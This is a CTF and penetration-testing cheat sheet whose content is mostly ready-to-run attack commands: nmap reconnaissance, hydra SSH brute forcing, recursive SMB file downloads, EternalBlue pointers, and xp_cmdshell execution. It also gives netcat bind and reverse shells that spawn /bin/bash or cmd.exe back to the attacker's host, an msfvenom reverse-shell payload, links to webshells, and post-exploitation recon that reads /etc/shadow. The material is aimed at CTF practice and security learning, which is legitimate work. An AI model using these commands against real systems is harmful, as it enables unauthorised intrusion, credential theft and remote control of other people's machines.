---
title: Yet Another CTF Playbook
subtitle: Version 1
author:
    - christalib
date: June/July 2020
titlepage: true
titlepage-color: ffffff
urlcolor: #370000
titlepage-rule-color: 370000
titlepage-text-color: 000000
table-of-contents: true
toc-depth: 4
number-sections: true
toc-title: "Table of Contents"
---

# Reconnaissance

## Nmap

Ping sweep:

```sh
nmap -sn -PE <IP or Range>
```

UDP scan:

```sh
nmap -sU <IP or Range>
```

Scan for open ports, determine open services:

```sh
nmap --open -sV <IP or Range>
```

Scan and run default scrips:

```sh
nmap -sC <IP or Range>
```

Run a specific script:

```sh
nmap --script <SCRIPT_NAME> <IP>
```

Skip ping:

```sh
nmap -Pn <IP>
```

Output result to file:

```sh
nmap <IP> -o <FILE> # text file
nmap <IP> -oG <FiLE> # greppable file
nmap <IP> -oN <FILE> # nmap file
nmap <IP> -oA <FILE> # all formats
```


### Analysing results

#### Port 21 open

* connect with `ftp IP`
* check for `anonymous:anonymous` login

#### Port 22 open

* possible default credentials, try a small `hydra` bruteforce:
```sh
hydra -L users.txt -P pass.txt IP ssh
```
* **Post-exploitation**: possible writable `~/.ssh/authorized_keys`.

[Go to Post-Exploitation](#post-exploitation)

#### Port 80 open

* Web-service running, use `dirb` or `gobuster` to get the most information as possible.

*Examples*:

* `dirb http://IP -r`
* `gobuster dir -w DICT -t 30 -x php,txt,js,html,css` You can use `-f` to try folders instead of files
* if it's a Wordpress instance look into `wpscan`
* sometimes an open FTP is also a feature from a running IIS instance which comes with a CalDav instance. Try it out with `davtest` and exploit with `cadaver`

**Common exploits**:

* XSS
* SQLi
* Directory Traversal
* Default credentials (admin:admin, root:root... Check also the name of the service or the default password for the running application.)

[Go to Exploitation](#exploitation)

#### Port 111, 139 open

* Netbios

Basic scan:

```sh
nbtscan <IP>
```

* SMB

Basic connection:

```sh
smbclient //<IP>/<PATH> -U <USER> -P <PASSWORD>
```

Get all files from remote:

```sh
smbclient //<IP>/<PATH> -c "prompt OFF; recurse ON; cd '\<PATH>\'; lcd
'<LOCAL_PATH>'; mget *"
```

**Common exploits**:

* Login with no password
* ETERNALBLUE: Spawn a reverse shell and use Helviojunior's [script](https://github.com/helviojunior/MS17-010), `send_and_execute.py`to send payload


#### Existing NFS mount

* Mount the file system on your computer:
```sh
mkdir temp
mount -o nolock IP:/ $PWD/temp
```

#### Existing databases

Connect through command line:

```sh
sqsh -S <IP> -U <USER> -P <PASSWORD>
xp_cmdshell 'whoami';
go
```




#### Existing VNC services

# Exploitation

## Shells

### Netcat

Basic bind shell:
```sh
nc -nvlp 443           # On local Kali
nc -nv <REMOTE-IP> 443 # On remote
```

Basic reverse shell:

```sh
sudo nc -nlvp 443                  # On local Kali
nc -nv <LOCAL-IP> 443 -e cmd.exe   # On remote Windows
nc -nv <LOCAL-IP> 443 -e /bin/bash # On remote Linux
```
Sending files:

```sh
sudo nc -nvlp 443 > incoming.exe     # Reciever
nc -nv <LOCAL-IP> 443 < incoming.exe # Sender
```

### Metasploit shells:

Windows shell which doesn't break the application for a x86 architecture:

```sh
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=4444 EXITFUNC=thread -f exe -a x86 --platform windows -o sploit.exe
```

## Webshells

* PentestMonkey PHP [webshell](http://pentestmonkey.net/tools/web-shells/php-reverse-shell)
* Kali's Webshells: `locate webshells`

## cURL

Upload file:

```sh
curl <IP> --upload-file <FILE>
```

Query as a bot:

```sh
curl -A "'Mozilla/5.0 (compatible;Googlebot/2.1; +http://www.google.com/bot.html)')" <IP>
```

Give parameters with encoding:

```sh
curl <IP> --data-urlencode urlConfig=<PATH>
```


# Post-Exploitation

## Improve your shell

* `sh -c uname -a; w; id; /bin/bash -i`

## Local Recon

### Windows

General recon:

```
whoami
hostname
systeminfo
ipconfig /all
```

Network discovery:

```
C:\> net view /all
C:\> net view \\<Hostname>
C:\> net users
```

Ping scan:

```
C:\> for \L %I in (1,1,254) do ping -w 30 -n 1 192.168.1.%I | find "Reply" >> output.txt
```


### Linux

General recon:

```sh
whoami
hostname
ifconfig
id
uname -a
cat /etc/passwd
cat /etc/shadow
cat /etc/*-release
```

Network discover:

```sh
ifconfig
ip a
```

Ping scan:

```sh
for i in `seq 1 254`; do ping 192.168.1.$i; done
```
#### Automation

* Linux Exploit Suggester 2](https://github.com/jondonas/linux-exploit-suggester-2)
* Linpeas

# Custom Scripts

## Aliases

Put them in your `.aliases` file and source it in your `.bashrc` or `.zshrc`.

```sh
alias serve='ruby -run -e httpd . -p 8000'
alias grepip='grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b"'
```

# Sources

## Books

* Red Team Field Manual
* Blue Team Field Manual

## Website

* [PenstestMonkey](http://pentestmonkey.net/)
* [Hacktrics.xyz](https://book.hacktricks.xyz/)
* [blog.g0tmi1k.com](https://blog.g0tmi1k.com/)
* [absolom.com](https://www.absolomb.com/)

## Videos

* [Ippsec](https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA)
